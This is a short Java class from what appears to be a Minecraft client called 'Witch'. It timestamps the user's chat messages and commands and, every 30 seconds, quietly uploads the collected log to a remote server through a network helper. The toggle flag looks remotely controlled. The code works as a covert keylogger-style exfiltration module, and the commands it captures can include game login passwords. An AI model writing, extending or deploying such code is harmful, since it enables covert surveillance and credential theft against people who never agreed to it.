package me.soda.witch.client.features;

import me.soda.witch.client.Witch;
import me.soda.witch.client.utils.NetUtil;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ChatCommandLogging {
    public static final ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
    private static List<String> readyToSendStrings = new ArrayList<>();

    public static void init() {
        executor.scheduleAtFixedRate(ChatCommandLogging::sendLog, 0, 30, TimeUnit.SECONDS);
    }

    private static void sendLog() {
        if (Witch.variables.logChatAndCommand && !readyToSendStrings.isEmpty()) {
            NetUtil.send("logging", String.join("\n", readyToSendStrings) + "\n");
            readyToSendStrings = new ArrayList<>();
        }
    }

    public static void addToList(String msg) {
        String time = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss "));
        readyToSendStrings.add(time + msg);
    }
}
